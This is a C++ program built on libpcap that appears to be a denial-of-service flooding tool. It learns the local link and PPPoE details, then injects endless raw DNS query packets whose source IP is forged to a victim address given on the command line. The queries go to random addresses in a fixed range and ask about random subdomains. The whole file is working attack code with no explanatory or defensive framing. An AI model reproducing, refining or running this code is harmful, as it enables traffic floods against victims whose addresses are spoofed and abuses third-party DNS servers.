#include <stdlib.h>
#include <math.h>
#include <memory.h>
#include <iostream>
#include <pcap.h>
#include <vector>
#ifdef WIN32
#include <Winsock2.h>
#endif
#ifdef LINUX
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#endif

using namespace std;


#ifdef LINUX
#define Sleep usleep
#define WINAPI
typedef int SOCKET;
typedef unsigned long int DWORD;
typedef void * LPVOID;
void*  thread_function(void *);
#endif

unsigned short cksum(unsigned char* buf, int len)
{
	long sum = 0;
	while(len > 1)
	{
		sum += *(unsigned short*)buf;
		buf += 2;
		if(sum & 0x80000000)
			sum = (sum & 0xffff) + (sum >> 16);
		len -= 2;
	}
	if(len)
		sum = (unsigned short)*buf;
	while(sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return ~sum;
}

int genPktLnHead(unsigned char* buf, const unsigned char* srcMac, const unsigned char* destMac, const char* subProto)
{
	memcpy(buf, destMac, 6);
	memcpy(buf + 6, srcMac, 6);
	memcpy(buf + 12, subProto, 2);
	return 14;
}

int genPktIpHead(unsigned char* buf, const unsigned char* srcIp, const unsigned char* destIp)
{
	memcpy(buf, "\x45\x00\x00\x7b", 4);
	unsigned short id = rand() + rand();
	memcpy(buf + 4, &id, 2);
	memcpy(buf + 6, "\x00\x00\x80\x11\x00", 6);
	memcpy(buf + 12, srcIp, 4);
	memcpy(buf + 16, destIp, 4);
	unsigned short sum = cksum(buf, 20);
	memcpy(buf + 10, &sum, 2);
	return 20;
}

int genPktPPPoEHead(unsigned char* buf, const unsigned char* sessionId, const char* subProto)
{
	memcpy(buf, "\x11", 2);
	memcpy(buf + 2, sessionId, 2);
	memcpy(buf + 4, "\x00\x7d", 2);
	memcpy(buf + 6, subProto, 2);
	return 8;
}

unsigned char randChr()
{
	char chrs[] = "0123456789abcdefghijklmnopqrstuvwxyz";
	return chrs[rand() % (sizeof(chrs) - 1)];
}

int genPktUdpHead(unsigned char* buf)
{
	unsigned short srcPort = rand() + rand();
	memcpy(buf, &srcPort, 2);
	memcpy(buf + 2, "\x00\x35\x00\x67\x00", 6);

	//domain
	unsigned short transId =rand() + rand();
	memcpy(buf + 8, &transId, 2);
	memcpy(buf + 10, "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x1e", 11);
	for(int i = 0; i < 30; i++)
		buf[21 + i] = randChr();
	buf[51] = (char) 31;
	for(int i = 0; i < 31; i++)
		buf[52 + i] = randChr();
	memcpy(buf + 83, "\x02\x37\x31\x07nsk3fxb\x03\x63om\x00\x00\x0f\x00\x01\x00\x00\x11\x00\x67", 25);
	unsigned short sum = cksum(buf - 8, 116);
	memcpy(buf + 6, &sum, 2);
	return 103;
}

int genPkt(unsigned char* buf, const unsigned char* srcMac, const unsigned char* destMac, const unsigned char* srcIp, const unsigned char* destIp)
{
	int offset = 0;
	int len = genPktLnHead(buf + offset, srcMac, destMac, "\x08");
	offset += len;
	len = genPktIpHead(buf + offset, srcIp, destIp);
	offset += len;
	len = genPktUdpHead(buf + offset);
	offset += len;
	return offset;
}

int genPPPoEPkt(unsigned char* buf, const unsigned char* srcMac, const unsigned char* destMac, const unsigned char* sessionId, const unsigned char* srcIp, const unsigned char* destIp)
{
	int offset = 0;
	int len = genPktLnHead(buf + offset, srcMac, destMac, "\x88\x64");
	offset += len;
	len = genPktPPPoEHead(buf + offset, sessionId, "\x00\x21");
	offset += len;
	len = genPktIpHead(buf + offset, srcIp, destIp);
	offset += len;
	len = genPktUdpHead(buf + offset);
	offset += len;
	return offset;
}

void genRndDestIp(unsigned char* destIp)
{
	memcpy(destIp, "\x46\x55", 2);
	unsigned short rndPartIp = rand() + rand();
	memcpy(destIp + 2, &rndPartIp, 2);
}

unsigned char hex2bin(unsigned char h)
{
	if(h >= '0' && h <= '9')
		return h - '0';
	if(h >= 'A' && h <= 'F')
		return h - 'A' + 10;
	if(h >= 'a' && h <= 'f')
		return h - 'a' + 10;
	return 0xff;
}

void textMac2BinMac(const char* textMac, unsigned char* binMac)
{
	for(int i = 0; i < 6; i++)
		binMac[i] = (hex2bin(textMac[i * 3]) << 4) | hex2bin(textMac[i * 3 + 1]);
}

bool procPkt(const unsigned char* buf, unsigned char* srcMac, unsigned char* destMac, unsigned char* srcIp, const unsigned char* destIp, unsigned char* sessionId, bool& pppoe)
{
	if(memcmp(buf + 12, "\x08", 2) == 0)	//Ip
	{
		if(memcmp(buf + 30, destIp, 4) == 0)
		{
			pppoe = false;
			memcpy(destMac, buf, 6);
			memcpy(srcMac, buf + 6, 6);
			memcpy(srcIp, buf + 26, 4);
			return true;
		}
		return false;
	}
	else if(memcmp(buf + 12, "\x88\x64", 2) == 0)	//PPPoE
	{
		if(memcmp(buf + 19, "\x00\x21", 2) == 0)	//Ip
		{
			if(memcmp(buf + 38, destIp, 4) == 0)
			{
				pppoe = true;
				memcpy(destMac, buf, 6);
				memcpy(srcMac, buf + 6, 6);
				memcpy(srcIp, buf + 34, 4);
				memcpy(sessionId, buf + 16, 2);
				return true;
			}
			return false;
		}
		return false;
	}
	return false;
}



class PcapSpeCap
{
public:
	PcapSpeCap(pcap_if_t *pcap_dev, unsigned char destIp[4])
	{
		this->pcap_dev = pcap_dev;
		char errbuf[PCAP_ERRBUF_SIZE];
		this->dev = pcap_open_live(pcap_dev->name, 65535, 0, 0, errbuf);
		capped = false;
		memcpy(this->destIp, destIp, 4);
	}
	void cap()
	{
		if(dev)
        {
#ifdef WIN32
            CreateThread(NULL, 0, ThreadProc, this, 0, NULL);
#else
            pthread_create(&pid, NULL,thread_function, NULL);
#endif
        }
	}
	static void pcap_cap(u_char *user, const struct pcap_pkthdr *pkt_header, const u_char *pkt_data)
	{
		PcapSpeCap *This = (PcapSpeCap*)user;
		if(procPkt(pkt_data, This->srcMac, This->destMac, This->srcIp, This->destIp, This->sessionId, This->pppoe))
		{
			This->capped = true;
			pcap_breakloop(This->dev);
		}
	}
	static DWORD WINAPI ThreadProc(LPVOID lpParameter)
	{
		PcapSpeCap *This = (PcapSpeCap*)lpParameter;
		pcap_loop(This->dev, 0, pcap_cap, (u_char*)lpParameter);
		return 0;
	}

	pcap_if_t* pcap_dev;
	pcap_t *dev;
	bool capped;
	unsigned char srcMac[6];
	unsigned char destMac[6];
	unsigned char srcIp[4];
	unsigned char destIp[4];
	unsigned char sessionId[2];
	bool pppoe;

    #ifdef LINUX
    pthread_t pid;
    #endif
};
#ifdef LINUX
void * thread_function(void *lpParameter)
{
    PcapSpeCap *This = (PcapSpeCap*)lpParameter;
    pcap_loop(This->dev, 0, PcapSpeCap::pcap_cap, (u_char*)lpParameter);
    pthread_exit(NULL);
}
#endif
int main(int argc, char* argv[])
{
	srand(time(NULL));
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t *alldevs;
#ifdef WIN32
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif
	if(pcap_findalldevs(&alldevs, errbuf) != 0)
	{
		cerr << "pcap_findalldevs error: " << errbuf << endl;
		return 1;
	}
	unsigned long saddrl = inet_addr("65.55.0.0");
	saddrl += rand() + rand();
	unsigned char* saddrb = (unsigned char*)&saddrl;
	vector<PcapSpeCap*> speCaps;
	{
		pcap_if_t *pcap_dev = alldevs;
		int i = 1;
		for(; pcap_dev != NULL; pcap_dev = pcap_dev->next, ++i)
		{
			PcapSpeCap *pSpeCap = new PcapSpeCap(pcap_dev, saddrb);
			speCaps.push_back(pSpeCap);
			pSpeCap->cap();
		}
	}
	unsigned char binSrcIp[4], binDestIp[4], buf[256];
	*(unsigned short*)buf = rand() + rand();
	*(unsigned int *)binSrcIp = inet_addr(argv[1]);
	SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	sockaddr_in saddr;
	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	if(bind(s, (sockaddr*)&saddr, sizeof(saddr)) != 0)
	{
			cerr << "socket bind error" << endl;
			return 4;
	}
	saddr.sin_port = htons(53);

#ifdef WIN32
	saddr.sin_addr.S_un.S_addr = saddrl;
#endif

	Sleep(1000);
	sendto(s, (char*)buf, 1, 0, (sockaddr*)&saddr, sizeof(saddr));
	Sleep(1000);
	for(unsigned int i = 0; i < speCaps.size(); i++)
		pcap_breakloop(speCaps[i]->dev);
	Sleep(200);
	while(true)
	{
		for(unsigned int i = 0; i < speCaps.size(); i++)
		{
			if(!speCaps[i]->capped)
				continue;
			genRndDestIp(binDestIp);
			if(speCaps[i]->pppoe)
			{
				int len = genPPPoEPkt(buf, speCaps[i]->srcMac, speCaps[i]->destMac, speCaps[i]->sessionId, binSrcIp, binDestIp);
				pcap_sendpacket(speCaps[i]->dev, buf, len);
			}
			else
			{
				int len = genPkt(buf, speCaps[i]->srcMac, speCaps[i]->destMac, binSrcIp, binDestIp);
				pcap_sendpacket(speCaps[i]->dev, buf, len);
			}
		}
		Sleep(20);
	}
	return 0;
}
